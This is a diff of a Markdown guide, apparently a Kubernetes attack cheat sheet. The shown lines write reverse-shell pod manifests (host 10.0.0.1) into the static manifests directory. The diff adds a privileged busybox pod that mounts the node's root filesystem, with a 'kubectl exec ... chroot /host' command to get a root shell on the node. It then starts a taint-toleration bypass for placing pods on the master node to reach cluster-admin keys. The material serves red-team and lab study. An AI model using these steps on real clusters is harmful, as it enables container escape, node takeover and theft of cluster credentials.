@@ -95,11 +95,42 @@ HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/hostnetwork/pod/hostnetwork-r
 HOST="10.0.0.1" PORT="3117" envsubst < ./manifests/hostipc/pod/hostipc-revshell-pod.yaml >> /etc/kubernetes/manifests/hostipc-revshell-pod.yaml
 HOST="10.0.0.1" PORT="3118" envsubst < ./manifests/nothing-allowed/pod/nothing-allowed-revshell-pod.yaml >> /etc/kubernetes/manifests/nothing-allowed-revshell-pod.yaml
 ```
+- This is a manifest which will deploy a privileged pod to a single node once running connect to it with a shell and run choot /host. For root access to the underlying node
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: noderootpod
+  labels:
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: noderootpod
+    image: busybox
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "while true; do sleep 30; done;" ]
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
+```
+- Above manifest will create a privileged pod on a node in the cluster. Once it's running `kubectl exec -it noderootpod chroot /host` should give you a root shell on the node
 
-5. Road to the Master Node
+1. Road to the Master Node
+  
 Most clusters cannot run containers on the Master Node
+
 - the Master Node stores the Service Account, keys and certificates, thanks to which we can become a cluster-admin
+
 Kubernetes has a Taints & Toleraitions mechanism that prevents running a Pod on the Master Node. **Bypass**:
+
 ```yaml
 spec:
     tolerations:
